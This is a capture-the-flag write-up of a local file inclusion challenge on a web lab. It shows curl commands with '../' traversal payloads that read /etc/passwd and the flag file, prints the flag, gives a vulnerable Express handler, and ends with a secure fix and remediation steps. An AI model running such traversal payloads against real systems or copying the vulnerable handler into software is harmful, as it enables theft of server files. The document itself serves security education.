# CafeClub - Local File Inclusion (LFI) CTF Writeup

## Challenge Information

| Field | Details |
|-------|---------|
| **Platform** | BugForge Labs |
| **Challenge URL** | `https://lab-1779482788964-x1adai.labs-app.bugforge.io/login` |
| **Category** | Web Exploitation |
| **Vulnerability** | Local File Inclusion (LFI) |
| **Hint** | File Inclusion |
| **Flag Format** | `bug{flag}` |

---

## Reconnaissance

The target application is **CafeClub**, a React-based e-commerce platform for premium coffee products. Upon visiting the login page, the application loads a single-page application (SPA) built with React.

### Step 1: Identifying the Attack Surface

Since the frontend is a compiled React app, I examined the JavaScript bundle to discover API endpoints the application communicates with:

```
/static/js/main.cf66af81.js
```

By extracting URL patterns from the bundled JavaScript, I identified the following API routes:

```
/api/login
/api/register
/api/verify-token
/api/products
/api/products/
/api/product/image?file=
/api/cart
/api/cart/
/api/checkout
/api/favorites
/api/favorites/
/api/orders
/api/orders/
/api/profile
/api/profile/password
```

### Step 2: Identifying the Vulnerable Endpoint

The endpoint `/api/product/image?file=` immediately stood out. A `file` parameter that directly references filenames is a classic indicator of potential **Local File Inclusion** vulnerabilities. This aligns perfectly with the challenge hint: *"File Inclusion"*.

---

## Exploitation

### Step 3: Confirming the LFI Vulnerability

I tested the endpoint with a directory traversal payload to read `/etc/passwd`:

```bash
curl -s "https://lab-1779482788964-x1adai.labs-app.bugforge.io/api/product/image?file=../../../../etc/passwd"
```

**Response:**
```
flag is somewhere else.
```

This confirmed two things:
1. The application is vulnerable to **path traversal** — it does not properly sanitize the `file` parameter.
2. The `/etc/passwd` file was replaced with a decoy message hinting the flag is stored elsewhere.

### Step 4: Locating the Flag

Since the application is likely running in a containerized environment (common for CTF labs), the app root is typically `/app`. I tested:

```bash
curl -s "https://lab-1779482788964-x1adai.labs-app.bugforge.io/api/product/image?file=../../../../app/flag.txt"
```

**Response:**
```
bug{drpsZsEQuqm4UWSI0fegCnCUSK5k7yx6}
```

---

## Flag

```
bug{drpsZsEQuqm4UWSI0fegCnCUSK5k7yx6}
```

---

## Vulnerability Analysis

### Root Cause

The server-side code handling the `/api/product/image` endpoint directly concatenates user-supplied input (`file` parameter) into a filesystem path without proper validation or sanitization. This allows an attacker to use `../` sequences to traverse outside the intended directory and read arbitrary files on the system.

### Vulnerable Code Pattern (Pseudocode)

```javascript
app.get('/api/product/image', (req, res) => {
    const filename = req.query.file;
    const filepath = path.join(__dirname, 'images', filename); // No sanitization!
    res.sendFile(filepath);
});
```

### Impact

- **Confidentiality Breach**: An attacker can read any file accessible to the application process, including configuration files, source code, environment variables, and secrets.
- **Information Disclosure**: Sensitive data such as database credentials, API keys, and internal application logic can be exposed.
- **Potential for Further Exploitation**: Leaked credentials or source code can lead to Remote Code Execution (RCE) or full system compromise.

---

## Remediation

1. **Input Validation**: Whitelist allowed filenames or use a mapping (e.g., product ID → filename) instead of accepting raw file paths.
2. **Path Canonicalization**: Resolve the final path and verify it remains within the intended directory.
3. **Use `path.basename()`**: Strip directory traversal sequences before constructing the file path.
4. **Principle of Least Privilege**: Run the application with minimal filesystem permissions.

```javascript
// Secure implementation
const path = require('path');
const IMAGES_DIR = path.resolve(__dirname, 'images');

app.get('/api/product/image', (req, res) => {
    const filename = path.basename(req.query.file); // Strip traversal
    const filepath = path.resolve(IMAGES_DIR, filename);

    // Ensure resolved path is within allowed directory
    if (!filepath.startsWith(IMAGES_DIR)) {
        return res.status(403).json({ error: 'Access denied' });
    }

    res.sendFile(filepath);
});
```

---

## Tools Used

- `curl` — HTTP requests and response analysis
- Browser DevTools — Initial reconnaissance
- Manual source code analysis of JavaScript bundles

---

## Key Takeaways

- Always inspect JavaScript bundles of SPAs to discover hidden API endpoints.
- A `file` parameter in any API endpoint is a strong indicator of potential LFI.
- In containerized CTF environments, flags are commonly stored in `/app/`, `/opt/`, or the filesystem root `/`.
- Decoy responses (like the `/etc/passwd` message) are common misdirection techniques in CTFs — persistence is key.
